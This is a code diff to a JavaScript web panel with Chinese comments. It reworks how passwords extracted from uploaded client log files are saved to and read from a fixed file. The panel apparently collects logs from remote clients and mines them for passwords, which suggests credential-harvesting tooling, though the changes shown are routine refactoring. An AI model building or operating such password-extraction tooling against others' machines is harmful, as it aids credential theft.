@@ -764,8 +764,8 @@ async function extractPasswords() {
             return;
         }
         
-        // 保存提取结果
-        const resultFilename = `passwords_${new Date().toISOString().slice(0, 19).replace(/[-:]/g, '').replace('T', '_')}.txt`;
+        // 保存提取结果到固定文件名
+        const resultFilename = 'extracted_passwords.txt';
         const resultContent = extractedPasswords.map((item, index) => {
             return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n`;
         }).join('\n');
@@ -781,7 +781,7 @@ async function extractPasswords() {
         
         if (uploadResponse.ok) {
             showToast(`成功提取 ${extractedPasswords.length} 个密码，已保存到 ${resultFilename}`, 'success');
-            // 刷新日志列表，以便用户可以看到新生成的密码文件
+            // 刷新日志列表，以便用户可以看到更新的密码文件
             refreshLogs();
         } else {
             showToast('保存提取结果失败', 'error');
@@ -823,29 +823,12 @@ function extractPasswordsFromLog(content, filename) {
     return passwords;
 }
 
-// 查看最新的密码提取结果
+// 查看密码提取结果
 async function viewLatestPasswords() {
     try {
-        // 获取所有日志文件
-        const response = await fetch('/api/logs');
-        const logs = await response.json();
+        // 直接查看固定的密码提取结果文件
+        const resultFilename = 'extracted_passwords.txt';
         
-        // 筛选出密码提取结果文件
-        const passwordFiles = logs.filter(log => log.filename.startsWith('passwords_'));
-        
-        if (passwordFiles.length === 0) {
-            showToast('暂无密码提取结果', 'error');
-            return;
-        }
-        
-        // 按时间排序，获取最新的文件
-        passwordFiles.sort((a, b) => {
-            return new Date(b.uploadTime) - new Date(a.uploadTime);
-        });
-        
-        const latestFile = passwordFiles[0];
-        
-        // 查看该文件
         // 由于密码文件保存在根目录，我们需要找到对应的客户端ID
         // 这里简化处理，使用第一个客户端的ID
         let clientId = null;
@@ -856,10 +839,10 @@ async function viewLatestPasswords() {
             clientId = 'default:9999';
         }
         
-        viewLog(clientId, latestFile.filename);
+        viewLog(clientId, resultFilename);
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
-        showToast('查看失败', 'error');
+        showToast('查看失败，可能还没有提取过密码', 'error');
     }
 }
 
